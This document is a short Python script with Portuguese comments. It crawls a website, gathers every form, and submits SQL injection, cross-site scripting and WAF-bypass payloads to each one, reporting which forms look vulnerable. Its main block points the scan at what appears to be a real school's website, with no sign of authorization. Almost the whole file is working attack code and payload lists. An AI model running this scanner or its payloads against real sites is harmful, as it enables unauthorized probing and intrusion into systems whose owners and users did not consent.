import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def crawler(url):
    visited = set()
    to_visit = [url]
    forms = []

    while to_visit:
        url = to_visit.pop(0)
        if url in visited:
            continue
        
        try:
            response = requests.get(url)
            visited.add(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Encontrar todos os forms na página
            for form in soup.find_all('form'):
                action = form.attrs.get('action')
                form_url = urljoin(url, action)
                forms.append((form_url, form.attrs.get('method', 'get').lower(), form))
            
            # Encontrar todos os links na página
            for link in soup.find_all('a'):
                href = link.attrs.get('href')
                if href and href not in visited:
                    to_visit.append(urljoin(url, href))
                    
        except requests.exceptions.RequestException as e:
            print(f"Erro ao acessar {url}: {e}")
    
    return forms
def test_sql_injection(form, url):
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1#", "admin' --"]
    method = form[1]
    form_details = form[2]
    
    for payload in payloads:
        data = {}
        for input_tag in form_details.find_all('input'):
            if input_tag.get('type') in ['text', 'search', 'email']:
                data[input_tag.get('name')] = payload
        
        if method == 'get':
            response = requests.get(url, params=data)
        else:
            response = requests.post(url, data=data)
        
        if "SQL" in response.text or "syntax" in response.text:
            print(f"Vulnerável a SQL Injection: {url}")
            break
def test_xss(form, url):
    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    method = form[1]
    form_details = form[2]
    
    for payload in payloads:
        data = {}
        for input_tag in form_details.find_all('input'):
            if input_tag.get('type') in ['text', 'search', 'email']:
                data[input_tag.get('name')] = payload
        
        if method == 'get':
            response = requests.get(url, params=data)
        else:
            response = requests.post(url, data=data)
        
        if payload in response.text:
            print(f"Vulnerável a XSS: {url}")
            break
def waf_bypass_test(form, url):
    payloads = [
        "' OR '1'='1 --",  # SQL Injection clássico
        "'/**/OR/**/'1'='1'/**/--",  # SQL Injection com comentário
        "/*!50000' OR '1'='1' --*/",  # SQL Injection com uso de MySQL comments
        "<sCrIpT>alert('XSS')</sCrIpT>",  # XSS com tags mistas
        "<img/src='x'/onerror=alert(1)>",  # XSS com tags HTML misturadas
    ]
    
    method = form[1]
    form_details = form[2]
    
    for payload in payloads:
        data = {}
        for input_tag in form_details.find_all('input'):
            if input_tag.get('type') in ['text', 'search', 'email']:
                data[input_tag.get('name')] = payload
        
        if method == 'get':
            response = requests.get(url, params=data)
        else:
            response = requests.post(url, data=data)
        
        if payload.split('--')[0] in response.text:
            print(f"Bypass WAF possível em: {url}")
            break
if __name__ == "__main__":
    url = "https://www.colegiolumbini.com.br/"
    forms = crawler(url)
    
    for form in forms:
        test_sql_injection(form, form[0])
        test_xss(form, form[0])
        waf_bypass_test(form, form[0])
